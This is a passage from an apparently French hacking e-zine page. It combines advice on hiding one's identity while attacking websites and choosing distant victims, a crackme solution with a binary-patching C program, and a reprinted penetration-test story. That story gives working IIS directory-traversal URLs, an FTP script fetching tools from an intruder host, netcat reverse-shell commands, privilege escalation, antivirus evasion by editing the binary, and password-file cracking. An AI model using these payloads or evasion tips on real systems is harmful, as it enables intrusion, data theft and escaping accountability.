        j'utilise est de mettre son num&eacute;ro de t&eacute;l&eacute;phone en 
        mode secret. Il suffit de faire le 36 51 avait de composer le num&eacute;ro 
        de votre correspondant. Donc dans vos param&ecirc;tres de connexion Internet 
        vous mettez comme num&eacute;ro 36 51 xx xx xx xx xx avec les x repr&eacute;sentant 
        le num&eacute;ro de votre FAI. Attention, si votre victime appelle l'admin 
        du proxy, il peut r&eacute;cup&eacute;rer le nom de votre FAI, les appeler. 
        Votre FAI voyant que le num&eacute;ro est cach&eacute; fait alors appel 
        &agrave; France Telecom qui peut rendre visible le num&eacute;ro de t&eacute;l&eacute;phone 
        et ceci m&ecirc;me une fois le hack totalement termin&eacute; (le pirate 
        s'est d&eacute;connect&eacute;...) </p>
      <p>Mais l&agrave; encore &ccedil;a ne sert &agrave; rien si les informations 
        que vous avez donn&eacute; sont vraies !!! Evitez donc les abonnements 
        avec pr&eacute;l&egrave;vement automatique o&ugrave; des trucs comme &ccedil;a 
        o&ugrave; vous devez donner vos vraies coordonn&eacute;es. Quelques solutions 
        s'offrent &agrave; vous : les acc&egrave;s sans abonnements du style Mageos 
        (le provider de la FNAC). Mais je sais pas si ils le font toujours. Sinon 
        il y avait nolog, un FAI qui comme son nom l'indiquait ne gardait aucune 
        trace de ses clients. Bref la fournisseur de r&ecirc;ve pour tout hacker 
        qui se respecte. Malheuresement il ont eu quelques probl&egrave;mes avec 
        la justice (putain de big brother) et je ne sais pas si ils existent toujours.</p>
      <p>Une autre solution ? Hacker d'un cybercaf&eacute;, mais vu les restrictions 
        qu'il peut y avoir &ccedil;a vaut pas la peine :(. Laisser plut&ocirc;t 
        un sniffer qui tourne en fond et revenez plus tard :) Sinon dans le m&ecirc;me 
        style vous piquez la connexion Internet d'un autre mec.</p>
      <p>L'anonymat parfais c'est le d&eacute;tournement de ligne t&eacute;l&eacute;phonique 
        (Beige Boxing) coupl&eacute; avec les techniques que l'on a vu avant. 
        Et l&agrave;, &agrave; moins d'&ecirc;tre en plein dans le champ de vision 
        d'un satellite de la NSA ya pas de danger :).</p>
      <p>Mais tout &ccedil;a c'est bien compliqu&eacute; !! Si vous voulez mon 
        avis, n'attaquez pas de sites trop importants style gouvernements, sites 
        militaires. Quand au multinationnales et aux sites d'Universit&eacute;s 
        mieux vaut attaquer les &eacute;trang&egrave;res. Plus la victime est 
        loin, plus elle sera d&eacute;motiv&eacute;e pour vous retrouver. Hackez 
        la Nouvelle Z&eacute;lande et l'Alaska ;p</p>
    </td>
  </tr>
  <tr> 
    <td height="18" valign="top" class="textgras" bgcolor="#000000"><a name="sevensynkop"></a>Solution 
      du crackme de An-Mojeg</td>
  </tr>
  <tr> 
    <td height="80" valign="top"><span class="textpetit">Bon on commence par &eacute;tudier 
      le prog : Il demande un nom d'utilisateur et un serial. Malheuresement il 
      fait le difficile quand je lui donne sirius01 et 666fuckyou. (m&ecirc;me 
      en &eacute;tant plus poli style je lui donne 'password' en login et 'stp' 
      en pass il veut pas, c'est vraiment de la mauvaise volont&eacute; ;-)<br>
      Alors on se dit qu'il va nous laisser passer de gr&egrave;s ou de force 
      !!!<br>
      Quand ca marche pas on obtient :<br>
      _________________________________<br>
      __* Snif *________________________|<br>
      &nbsp;&nbsp;&nbsp;Meuh faut reflechir + ke ca !!! &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(OK) 
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| </span> 
      <p class="textpetit">Elle est belle ma boite de dialogue hein ?</p>
      <p class="textpetit">Alors on va dans Win32Dasm, on regarde les strnRef 
        et on voit que ya pas &quot;Meuh...&quot;<br>
        En revanche ya *Snip* mais si on regarde autour ya que des strcpy et pi 
        encore en haut (si on cherche d'ou on vient) on tombe sur du code chelou 
        dans lequel on veut<br>
        pas mettre les pieds. Toutes ces strcpy servent a mettre des chaines de 
        caract&egrave;res dans des vaiables, comme si le concepteur avait fait 
        des titre=&quot;*Snip*&quot; (affectation).</p>
      <p class="textpetit">On remarque aussi des chaines qui pourraient etre un 
        serial (LET-154873201478-FGHB) ou un login (An-Mojeg) mais ca semble trop 
        beau pour etre vrai, d'ailleurs ca<br>
        marche pas.</p>
      <p class="textpetit">Il y a alors plusieurs facons (different ways) de cracker 
        ce prog :</p>
      <p class="textpetit">The moulu way (La facon du lucky man) : dans votre 
        lassitude (ou votre curiosit&eacute;), vous descendez de quelques lignes 
        et vous tombez sur deux strcmp suivi d'un<br>
        MessageBoxA, sch&eacute;ma classique d'une v&eacute;rification login / 
        password puis affichage de la validite des informations.<br>
        Vous cochez les cases Enables ... de WinDasm et le Stop auto on API.<br>
        Vous posez des breaks sur les deux fonctions strcmp et vous vous appercevez 
        qu'il compare 'sirius01' avec 7Sk-An-Mojeg puis il saute sur 00401365 
        qui n'est autre que<br>
        la mechante message box !!<br>
        Comme on aimerait bien connaitre le serial, on relance le prog avec '7Sk-An-Mojeg' 
        et '666fuckyou' en serial. On a strcmp('666fuckyou','LET-154873201478-FGHB'); 
        c clair non ?<br>
        Voici le code :</p>
      <p class="textpetit">:00401325 68FF304000 push 004030FF &lt;- la brute<br>
        :0040132A 6863314000 push 00403163 &lt;- le bon</p>
      <p class="textpetit">* Reference To: KERNEL32.lstrcmpA, Ord:02D6h &lt;-- 
        On compare les usernames<br>
        |<br>
        :0040132F E868030000 Call 0040169C<br>
        :00401334 83F800 cmp eax, 00000000<br>
        :00401337 752C jne 00401365 &lt;-- saut vers '*Snif*'<br>
        :00401339 6831314000 push 00403131 &lt;- le truand<br>
        :0040133E 6895314000 push 00403195 -&lt; le bon</p>
      <p class="textpetit">* Reference To: KERNEL32.lstrcmpA, Ord:02D6h &lt;-- 
        on compare les serials<br>
        |<br>
        :00401343 E854030000 Call 0040169C<br>
        :00401348 83F800 cmp eax, 00000000<br>
        :0040134B 7518 jne 00401365 &lt;-- bad boy<br>
        :0040134D 6A00 push 00000000<br>
        :0040134F 68C7314000 push 004031C7<br>
        :00401354 68DB314000 push 004031DB<br>
        :00401359 FF7508 push [ebp+08]</p>
      <p class="textpetit">* Reference To: USER32.MessageBoxA, Ord:01BBh &lt;-- 
        good boy<br>
        |<br>
        :0040135C E8F3020000 Call 00401654<br>
        :00401361 C9 leave<br>
        :00401362 C21000 ret 0010</p>
      <p class="textpetit">Une facon plus brute ? Ba on fait un break sur tous 
        les strcmp (yen a que 5) avec les infos de w32dasm et ca revient au m&ecirc;me.</p>
      <p class="textpetit">Facon 'Allez j'me touche !!!'<br>
        Vous d&eacute;sassemblez le prog, vous vous mettez sur l'entry-point, 
        vous regardez en bas de la fen&ecirc;tre, vous voyez : Code Date @:00401040 
        @Offset 00000440h. Ca va nous permettre de faire la conversion Code &lt;-&gt; 
        Offset.<br>
        Vous ouvrez le crackme avec un &eacute;diteur hexa. Vous cherchez &quot;Meuh 
        faut reflechir + ke ca !!!&quot;. Vous le trouvez a l'offset 6A0.<br>
        Vous calculez le magic number : 401040 - 440 = 400C00.<br>
        On fait 6A0 + 400C00 = 004012A0 c'est l'adresse de la chaine sous w32dasm.<br>
        Donc on fait une recherche sur 'push 004012A0', on a un seul r&eacute;sultat 
        :</p>
      <p class="textpetit">:00401316 68A0124000 push 004012A0 &lt;-- ici<br>
        :0040131B 6849324000 push 00403249</p>
      <p class="textpetit">* Reference To: KERNEL32.lstrcpyA, Ord:02DCh<br>
        |<br>
        :00401320 E87D030000 Call 004016A2</p>
      <p class="textpetit">On est un peut d&eacute;cu car on aurait pr&eacute;f&eacute;r&eacute; 
        que ce soit une MessageBox. Bon le strcpy a deux arguments, la source 
        et la destination. Ici la chaine d'erreur est mise en 403249.<br>
        On recherche 'push 00403249' on a deux occurences dont celle que l'on 
        vient de voir.<br>
        Donc la bonne est la :</p>
      <p class="textpetit">* Referenced by a (U)nconditional or (C)onditional 
        Jump at Addresses:<br>
        |:00401337(C), :0040134B(C)<br>
        |<br>
        :00401365 6A00 push 00000000<br>
        :00401367 683F324000 push 0040323F<br>
        :0040136C 6849324000 push 00403249 &lt;--ici<br>
        :00401371 FF7508 push [ebp+08]</p>
      <p class="textpetit">* Reference To: USER32.MessageBoxA, Ord:01BBh &lt;-- 
        on affiche bad boy<br>
        |<br>
        :00401374 E8DB020000 Call 00401654</p>
      <p class="textpetit">On est alors dans le cas d'un crack classique : On 
        a le message d'erreur, on revient &agrave; la source : 00401337 et 0040134B. 
        On s'appercoit que c'est deux strcmp et ksi on pose des breaks dessus 
        et bien on connait la suite.</p>
      <p class="textpetit">Comment on cracke le prog ? Ben on nop les deux sauts 
        conditionnels.<br>
        Pour faire le crack on reprend l'exemple de An-Mojeg, on le modifie un 
        peu et puis voila :</p>
      <p class="textpetit">#include &lt;stdio.h&gt;<br>
        #include &lt;stdlib.h&gt;</p>
      <p class="textpetit">void noper(FILE *f, long offset)<br>
        {<br>
        &nbsp;&nbsp;int i;<br>
        &nbsp;&nbsp;for (i=0;i&lt;2;i++,offset++)<br>
        &nbsp;&nbsp;{<br>
        &nbsp;&nbsp;&nbsp;&nbsp;fseek(f,offset,SEEK_SET);<br>
        &nbsp;&nbsp;&nbsp;&nbsp;fprintf(f,&quot;%c&quot;,0x90);<br>
        &nbsp;&nbsp;}<br>
        }</p>
      <p class="textpetit">void main()<br>
        {<br>
        &nbsp;&nbsp;FILE *crck = fopen(&quot;crackme1.exe&quot;, &quot;r+&quot;);</p>
      <p class="textpetit"> &nbsp;&nbsp;if(!crck){<br>
        &nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Erreur lors de l\'ouverture du fichier\n&quot;);<br>
        &nbsp;&nbsp;&nbsp;&nbsp;system(&quot;pause&quot;);<br>
        &nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br>
        &nbsp;&nbsp;}</p>
      <p class="textpetit"> &nbsp;&nbsp;noper(crck,1847L);<br>
        &nbsp;&nbsp;noper(crck,1867L);</p>
      <p class="textpetit"> &nbsp;&nbsp;fclose(crck);</p>
      <p class="textpetit"> &nbsp;&nbsp;printf(&quot;Fichier cracke. sirius_black\nmembres.lycos.fr/lotfree\n&quot;);<br>
        &nbsp;&nbsp;system(&quot;pause&quot;);<br>
        }</p>
    </td>
  </tr>
  <tr> 
    <td height="18" valign="top" class="textgras" bgcolor="#000000"><a name="hd1"></a>Autopsy 
      d'une intrusion r&eacute;ussie</td>
  </tr>
  <tr> 
    <td height="163" valign="top" class="textpetit"> 
      <p>Cet article est tir&eacute; de Hackers Digest num&eacute;ro 2. Ce mag 
        a bizarrement fait peut parler de lui et il me semble qu'ils ont arr&ecirc;t&eacute;s 
        (le 3 date de hiver 2002). Dans le num&eacute;ro 2, un mec qui travaille 
        dans une bo&icirc;te de test d'intrusion a &eacute;crit l'article que 
        vous allez pouvoir lire ci-dessous. C'est la description de deux intrusions 
        qu'il a r&eacute;alis&eacute; dans le cadre de son travail. Dans la premi&egrave;re 
        il utilise la faille Unicode. Mais l&agrave; ou il est fort c'est qu'il 
        ne s'arr&ecirc;te pas &agrave; des simples commandes pass&eacute;es &agrave; 
        travers son navigateur !! Non non non !! Le mec ne s'arr&ecirc;te que 
        lorsqu'il est totalement ma&icirc;tre de la machine et m&ecirc;me du r&eacute;seau 
        entier ; du grand Art !!!</p>
      <p>Il y a aussi la fa&ccedil;on dont il contourne le probl&egrave;me de 
        l'antivirus. On peut pas s'emp&ecirc;cher de rire devant un anitivirus 
        pareil... Enfin vous verrez par vous m&ecirc;me :)</p>
      <p>=================[ Autopsy of a Successful Intrusion ]==================</p>
      <p> --- by Floydman ---<br>
        <br>
        <br>
        Abstract</p>
      <p>This paper consists of the recollection and analysis of two network intrusion 
        that I have performed as part of my duties as a computer security consultant.<br>
        The name of the company I worked, as well as their customers that I hacked 
        into, will remain anonymous for obvious reasons. The goal of this paper 
        is to show real life cases of what computer security looks like in the 
        wild, in corporate environments. I will try to outline the principal reasons 
        why these intrusions were successful, and why this kind of performance 
        could be achieved by almost anybody, putting whole networks at risks that 
        their owner don't even begin to realize yet.</p>
      <p>Preface</p>
      <p>It's been over a year now that I delved into computer security. Before 
        that, I was doing computer support and server admin on various platforms: 
        DOS, OS/2, Novell, Windows. I have always been kind of a hack, but I never 
        realized it until I had enough free time ahead of me to start studying 
        the hacking scene and the computer security industry more in depth. That 
        is how I started writing whitepapers, and that I was eventually invited 
        to a conference to present some of my work. But I didn't want to have 
        problems with the law, and I was short on ressources (money, boxes, bandwidth), 
        so I limited myself to keeping tracks of new vulnerabilities and understanding 
        how they worked without actually having the opportunity to try them on 
        a real machine. So when I got this job and they asked me to try to hack 
        these networks, I was really anxious at what I could really do. After 
        all, I can't be worse than a script kiddie, can I?</p>
      <p>Targeted audience</p>
      <p>This document is presented to anyone who has interests in computer security, 
        network intrusion, hacking, viruses and Trojan horses, network administration 
        and computing in general.</p>
      <p>Introduction</p>
      <p>What I am about to describe here is the complete story of two successful 
        network intrusion, where we (quickly and rather easily) had complete access 
        to everything. These two networks are the same kind of networks that get 
        infected all the time with I Love You, Melissa, Anna.Kournikova, Sircam 
        only to name a few. The people who runs these networks, and the people 
        who own them, can't keep ahead with plain viruses (for another sample 
        of this, read &quot;Virus protection in a Microsoft Windows network, or 
        How to stand a chance&quot;), let alone with a dedicated intruder that 
        will hopefully be smart enough to hide his tracks (but even that his not 
        even to be a requirement soon if it keeps up like that, as we'll see later). 
        And these are networks owned by (apparently) respected big corporations, 
        and were equiped with firewalls and antivirus software. And they still 
        wonder why e-commerce never lifted up to expectations?</p>
      <p>Technical background of the hack</p>
      <p>Both networks were based on Microsoft systems, which is not that surprising 
        since it is the most (and by far) used platform in corporate environments, 
        especially on the desktop area. Both intrusions were made over the Internet 
        with tools freely available on the Internet. They used vulnerabilities 
        that were known for quite a long time, and we sometimes had to use a bit 
        of imagination to do the rest. If you are a Windows NT/2000 admin, what 
        you are about to read should scare you to hell. If you are a malicious 
        hacker that does this kind of thing for a living of just plain fun, you 
        probably know all this stuff already.<br>
        But you'll probably still want to read on to have a good laugh.</p>
      <p>Both intrusions followed the same methodology, similar to those of a 
        typical intrusion, which is gathering of information, analysis of the 
        information, research of vulnerabilities, and implementation of the attack 
        (we didn't have time to test on one of our machines, but that didn't matter), 
        repeat. Both attacks were done from our facilities using our dedicated 
        ADSL line over the Internet. One of the intrusion involved going undercover 
        physically onsite at the customer premises to plant a wireless hub on 
        the network. A laptop equipped with a wireless network card was also used 
        to link with the hub momentarilly, to avoid detection.</p>
      <p>Some of the tools used were:</p>
      <p>SuperScan : to scan classes of IP address to determine open ports<br>
        CyberKit : this tool lets you do IP infomation gathering (DNS lookups, 
        traceroute, whois, finger)<br>
        nc.exe : NetCat, ported to Win32. This program lets you initiate telnet 
        connections on any port you want<br>
        hk.exe : program that exploit a vulnerability in the Win32 API (LPC, Local 
        Procedure Call) that can be used to get System Level access<br>
        net commands : these should be known to all NT admins (net view, net share, 
        net use, etc)<br>
        a hex editor : these programs let you edit binary files in hexadecimal/ascii 
        format, a bit similar to notepad for text files<br>
        l0phtcrack : this software lets you crack the NT passwords file<br>
        whisker.pl : this script will scan webservers for known vulnerabilities, 
        along with instructions on how to expoit them<br>
        EditPad Classic : this is a Notepad Deluxe, where we gather the information 
        collected during the hack and other tools that I forgot that were part 
        of the NT Ressource kit or that I will mention later in the text.</p>
      <p>Sugar input was provided with a supply of M&amp;Ms and coke (the drink, 
        not the sniff).</p>
      <p>The first victim</p>
      <p>Pseudonym : XYZ Media Publishing Corporation Type of company : Big Media 
        Corporation (TV, radio, newspapers, magazines, record company, don't they 
        all do that nowadays?) Time allowed to hack : 3 man/days Goal : penetrate 
        the network as far as possible and get evidence of intrusion</p>
      <p>So I start with the beginning, making DNS lookups on their IP classes, 
        whois requests and port scan the IP addresses of the company's main website 
        as well as the subsidiaries websites. It turns out that there are over 
        140 machines publicly exposed to the Internet (web servers, DNS, mail, 
        B2B), mostly Windows NT machines, with a couple *nix in the lot. A quick 
        header scan of the web servers show effectively a mix of IIS 3.0 and 4.0. 
        Now, the problem is to figure out where to start. Let's start with the 
        obvious, the main website (NT 4.0 IIS 4.0). A quick check at the Bugtraq 
        archive at SecurityFocus shows me that the &quot;Directory traversal using 
        Unicode vulnerability&quot; is still quite popular (especially by script 
        kiddies who uses it to perform website defacements), even if it's been 
        out for about a year already. Especially since there is a new variation 
        every couple of weeks or so. So I fire up my specially crafted hacking 
        tool, MS Internet Explorer (sarcasm directed at medias covering hacking 
        incidents).</p>
      <p>The directory traversal vulnerability works by fooling the web server 
        to give you content located outside of the web directory that it is supposed 
        to be limited to. By default (which must cover anything between 50%-90% 
        of the installed base), the content served by the server is located at 
        C:\Inetpub\wwwroot. So, instead of requesting the document http://www.victim.com/index.html 
        (that correspond physically on the server to the file C:\Inetpub\wwwroot\index.html), 
        you request something like http://www.victim.com/../../index.html, which 
        will request the file C:\index.html. Of course, index.html doesn't exist 
        on C:\, but that doesn't matter, since from there you can request any 
        file that you know the location of, based on a default install. Things 
        that come to mind is the cmd.exe program, that you can use to issue commands 
        on the web server as if you were sitting there and typing in a DOS box. 
        I have to say at this point that the vulnerability doesn't work like I 
        said, but that was a simple explanation of</p>
      <p>http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+dir+c:\+/s</p>
      <p>Notice that + replaces the [Space] character in your commands, and ?/c+ 
        is required to pass parameters to cmd.exe. %1c%pc is the Unicode equivalent 
        to /.. (other equivalents may work, see the Bugtraq entry about this vulnerability 
        for more details). So now we have in our browser window a complete listing 
        of all files present on the C: drive of the server. We can do the same 
        thing for the D: drive, to see if it's present, and if it is, do it for 
        the E: drive, and so on. The idea is to gather up as much information 
        about the machine as we can get. At this point, we know enough to see 
        what software runs on the machine, where the data is located. Notice that 
        at this point, we could start to issue ping commands or net commands to 
        try to map to any internal network the server may be talking to, but issuing 
        these commands with the web browser is not really convenient. So we're 
        going to get a real command prompt.</p>
      <p>First, I set up a FTP server (no anonymous access, of course) on my laptop 
        and put my tools in the main FTP folder. Namely, I put nc.exe and hk.exe 
        and a couple from the ressource kit. Then I use the FTP utility conviniently 
        waiting where I expect it to be for me to initate a connection to my laptop 
        and fetch my tools. Since the FTP program is interactive and that I can 
        only issue commands via the web server, I have to make a FTP script on 
        the server. To do this, I simply issue echo commands redirected to a text 
        file, using the directory traversal vulnerability.</p>
      <p>http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+open+ftp.intruder.com+&gt;&gt;ftp.txt<br>
        http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+username&gt;&gt;ftp.txt<br>
        http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+password&gt;&gt;ftp.txt<br>
        http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+prompt&gt;&gt;ftp.txt<br>
        http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+bin&gt;&gt;ftp.txt<br>
        http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+mget+*.exe&gt;&gt;ftp.txt<br>
        http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+echo+bye&gt;&gt;ftp.txt</p>
      <p>I check out my script with my web browser one last time to make sure 
        there I made no mistake, and then I launch the FTP session, assuming that 
        the firewall permits this kind of traffic. And it does.</p>
      <p>http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+ftp+-s:ftp.txt</p>
      <p>Once this is done, I will use netcat to have a command prompt on the 
        webserver. Netcat is a very useful networking tool that you can use to 
        communicate via any port, and spawn a shell prompt. nc -h will give you 
        these options:</p>
      <p><br>
        C:\nc11nt&gt;nc -h<br>
        [v1.10 NT]<br>
        connect to somewhere: nc [-options] hostname port[s] [ports] ...<br>
        listen for inbound: nc -l -p port [options] [hostname] [port]<br>
        options:<br>
        &nbsp;&nbsp;-d detach from console, stealth mode<br>
        &nbsp;&nbsp;-e prog inbound program to exec [dangerous!!]<br>
        &nbsp;&nbsp;-g gateway source-routing hop point[s], up to 8<br>
        &nbsp;&nbsp;-G num source-routing pointer: 4, 8, 12, ...<br>
        &nbsp;&nbsp;-h this cruft<br>
        &nbsp;&nbsp;-i secs delay interval for lines sent, ports scanned<br>
        &nbsp;&nbsp;-l listen mode, for inbound connects<br>
        &nbsp;&nbsp;-L listen harder, re-listen on socket close<br>
        &nbsp;&nbsp;-n numeric-only IP addresses, no DNS<br>
        &nbsp;&nbsp;-o file hex dump of traffic<br>
        &nbsp;&nbsp;-p port local port number<br>
        &nbsp;&nbsp;-r randomize local and remote ports<br>
        &nbsp;&nbsp;-s addr local source address<br>
        &nbsp;&nbsp;-t answer TELNET negotiation<br>
        &nbsp;&nbsp;-u UDP mode<br>
        &nbsp;&nbsp;-v verbose [use twice to be more verbose]<br>
        &nbsp;&nbsp;-w secs timeout for connects and final net reads<br>
        &nbsp;&nbsp;-z zero-I/O mode [used for scanning]<br>
        port numbers can be individual or ranges: m-n [inclusive]</p>
      <p></p>
      <p>So I will launch netcat in listening mode on port 53 (also used by DNS, 
        allowed by the firewall) on my laptop, and launch a netcat connection 
        bound to a command prompt from the webserver to my laptop (using the brwoser 
        once again).</p>
      <p>In my DOS box <br>
        nc -l -p 53 <br>
        and it hangs there... </p>
      <p>http://www.victim.com/..%1c%pc../winnt/system32/cmd.exe?/c+nc+-d+-e+cmd.exe+my.IP.address.ADSL+53 
      </p>
      <p>And the hung DOS box gets: </p>
      <p>Microsoft(R) Windows NT(TM)<br>
        (C)Copyright 1985-1996 Microsoft Corp.</p>
      <p>C:\Intetpub\wwwroot\scripts&gt;_</p>
      <p></p>
      <p>Voil&agrave;, I have a prompt. I use the whoami command from the NT Ressource 
        kit, to find out with disappointment that I am only INET_IUSR/Anonymous, 
        the anonymous Internet user account. So the web server doesn't run on 
        the Administrator account. That means that I still can't reach the NT 
        password file (also called the SAM database) because of the restricted 
        access. No problem, I think, I'll just initiate another telnet connection 
        using another port (23 Telnet, why not?) by using the hk.exe tool. This 
        tool uses a vulnerability involving an undocumented API call (NT_Impersonate_thread 
        or something like that) that lets a thread (a part of a process running 
        in memory) get the token (a security attribute that defines what security 
        level a thread can run, user space or kernel space) of a kernel thread 
        (LSASS or equivalent). To use this tool, you simply type hk followed by 
        any command you would want to run if you had NT AUTHORITY/SYSTEM level 
        privileges (this is above the Administrator account privileges). So I 
        t</p>
      <p>hk nc -d -e cmd.exe my.IP.address.ADSL 23 Bad command or file name</p>
      <p>What the?!? I make a dir command, and true enough I don't see any file 
        named hk.exe. Did I forget to download it before? I make another FTP download 
        (using the script again because interactive FTP sessions over a netcat 
        connection doesn't work too well), and sure enough I see the file being 
        downloaded from my laptop. I make a dir command again, and the file still 
        isn't there. So I go to C:\ and make a dir hk.exe /s, and what do you 
        know?<br>
        It's in the C:\Program Files\Antivyrtec Associates\Antivirus\Quarantine\ 
        folder. Damn, the stupid antivirus caught my file. How can I get root 
        without it?</p>
      <p>Most antivirus products work by matching byte streams of known viruses 
        and other malware to the programs and files your computer uses. If a match 
        is found, then the file is most probably of dangerous nature, and the 
        antivirus prevents the user from opening it. Polymorphic viruses uses 
        a flaw in this strategy by modifying themselves every time, making it 
        difficult to identify a reliable byte stream in the virus code that can 
        be used to clearly identify it. Can I also use this flaw to my advantadge? 
        Of course. Actually, that day, I have lost a lot of respect towards antivirus 
        products seeing how easily it was to circumvent it.</p>
      <p>Using a hex editor (I don't remember which one, but ther all do pretty 
        much the same), I opened hk.exe. What I now see is all the binary code 
        of the executable, shown in an hexadecimal representation. On the right 
        hand side, we see an ASCII representation of each byte of code. Since 
        this is compiled code, it is pretty hard to modify anything in there without 
        screwing up the program and making it useless. Especially since we don't 
        know what bit pattern the antivirus software looks for, and that I know 
        nothing in reverse-engineering. The only thing editable in the program 
        is a small section where we can actually read the message displayed by 
        hk.exe when it successfully executes (something like &quot;Your wish is 
        my command, master&quot;). What the heck, let's change that and see what 
        happens. So I replace the string with XXXX XXXX XX XX XXXXXXXX XXXXXX, 
        and rename the file hk2.exe (which is why I don't remember the exact string, 
        now I only care to use hk2.exe). A quick FTP download later, and I make 
        a dir command</p>
      <p>So anyway, I open another DOS box on my machine and I initiate a new 
        listening connection on my laptop</p>
      <p>nc -l -p 23</p>
      <p>and I type the command</p>
      <p>hk2 nc -d -e cmd.exe my.IP.address.ADSL 23 on the active netcat on the 
        webserver and we get:</p>
      <p>hk2 nc -d -e cmd.exe my.IP.address.ADSL 23</p>
      <p>lsass pid &amp; tid are: 50 - 53</p>
      <p>Launching line was: nc -d -e cmd.exe my.IP.address.ADSL 23</p>
      <p>XXXX XXXX XX XX XXXXXXXX XXXXXXNtImpersonateClientOfPort suceeded</p>
      <p><br>
        (On the listening DOS box)<br>
        Microsoft(R) Windows NT(TM)<br>
        (C)Copyright 1985-1996 Microsoft Corp.</p>
      <p>C:\Intetpub\wwwroot\scripts&gt;</p>
      <p>whoami<br>
        NT AUTHORITY/SYSTEM</p>
      <p></p>
      <p>At this point, I see no reason to keep the first netcat connection, so 
        I kill it. I am now in complete control of the web server and I can do 
        whatever I want on it. I start to upload the SAM database on my laptop 
        and I start cracking it with l0phtcrack, using a dictionnary attack first, 
        then a brute force attack to uncover the few passwords left, if any. While 
        the passwords cracks, I continue my investigations of my newly owned machine. 
        I issue the ipconfig command, and I see the IP addresses of the two network 
        interface cards installed on the machine. The IP address on one of the 
        NIC is effectively the public IP of the web server. The other one bears 
        an internal IP address, and a few pings and net commands later, I have 
        a complete list of the NT Domains, PDC, BDC, Servers. I could talk to 
        the whole internal network! Using some of the usernames/passwords that 
        I cracked, I could go in any domain and from there connect to any workstation. 
        With net accounts, I saw some administrative accounts that I have</p>
      <p>As I hopped from one workstation to another, from server to server, I 
        kept making dir c: and dir d: images, downloaded files in various interesting 
        folders (marketing, HR, finance, IT, production, contracts, budget, etc), 
        along with a couple Outlook mailboxes, which tells me that I could probably 
        use the flaws in this software to send a custom virus to take control 
        of a machine, but why bother? I already had access to everything: network 
        maps, list of software approved by IT, standard configuration of a desktop, 
        resumes from applicants, budget of last and current year of various departments, 
        production status reports, finance reports, company acquisition plans 
        and contracts, full employee lists, with phone number, e-mails and salaries, 
        layoff severance documents, full calendar appointments of some management 
        people, along with their mailboxes, which also showed up some interesting 
        things. I will always remember this e-mail I read that the guy I hacked 
        into received from one of his friends. In the e-mail,</p>
      <p>We were about to run out of time, since my three days were almost run 
        out. Let's not forget that I had to write a report after that, and that 
        the customer only paid for such amount of time. But there was still a 
        little piece of the network that I couldn't get access to. It was refusing 
        any connection attempt from any domain that I already had control of. 
        That was a separate NT domain, on its own IP class C network, with very 
        restricted access, probably accessed only by the board of directors if 
        I rely on the domain name. No password that proved useful before would 
        work. A port scan showed me that there was a web server on this network, 
        and I knew it was a NT server, and most probably running IIS 4 as well.<br>
        But how can I launch a web request from a DOS prompt in order to hack 
        the server like I did the first one? I could probably make a tool someday, 
        but I definetely<br>
        don't have this kind of time on my hands right now. I see the gold, I 
        want the gold (even though I have plenty already), and I am willin</p>
      <p>Winvnc works a bit like nc, but instead of giving a simple command prompt, 
        it give full access to the graphical user interface (GUI) as if you were 
        sitting in front of the machine, the same way as PCAnywhere does. This 
        have the side effect that a person sitting in front of the machine will 
        see all your actions, which means that you have been spotted.</p>
      <p>In my case, I had nothing to lose, so the plan is to download Winvmc 
        on the machine I currently own, initiate the GUI connection from there, 
        and then use the browser installed on the web server to launch a similar 
        attack to the intranet server using the directory traversal vulnerability. 
        From there, I hope to be able to find some usernames and passwords that 
        I can use to gain access to the protected machines in the same fashion 
        as to what I had done so far. So I initiate the Winvnc session, and surprise, 
        I see right in the middle of the screen two pop-up warnings from the antivirus 
        software, generated from the two unsuccessful downloads of hk.exe, 2 days 
        ago. So I click OK to remove any visual evidence of my presence, and I 
        proceed to clean my presence a bit, deleting all the stuff that I won't 
        need anymore. I also notice some of the NT Res kit that I used in another 
        folder that was not mine. That made me wonder if it was the admin who 
        conveniently installed it there for anyone to use, of if it was the I 
        was about to launch IE in order to finish my attack quickly and return 
        to the stealthier DOS command prompt that a second surprise happens: Notepad 
        opens up with a message saying &quot;who r u?&quot;. I knew I could be 
        spotted, and I have been spotted. The spelling of the message makes me 
        wonder if I am dealing with a IT<br>
        professional or a script kiddie here, but a quick look at the processes 
        running on the machine (ps.exe from the NT Res Kit) shows me that he is 
        connected via a PCAnywhere session, so it's probably a tech support, but 
        he's not in front of the machine. So I write &quot;God&quot; in the notepad 
        message, give him about 5 seconds to read my reply, and then I kill his 
        connection (kill.exe). Then I quickly erased the rest of my files on the 
        machine, and killed my session while I was laughing hard with a colleague 
        beside me.</p>
      <p>Too bad that I missed that last vault, and that I have been spotted, 
        but if I wasn't only a guy doing his job, working 9-5 because I also have 
        a life, and under an artificial schedule, I would have cracked it, undetected. 
        A dedicated corporate spy or malicious hacker would have done this at 
        night, and would have been completely undetected for as long as he wants.</p>
    </td>
  </tr>
  <tr> 
    <td height="12" valign="top" class="textgras" bgcolor="#000000"><a name="nag"></a>Virer 
      les nags du fNaaX's cRACKME #2</td>
  </tr>
  <tr> 
    <td height="20" valign="top" class="textpetit"> 
      <p class="textpetit">Voici un crackme que j'ai trouv&eacute; sur le site 
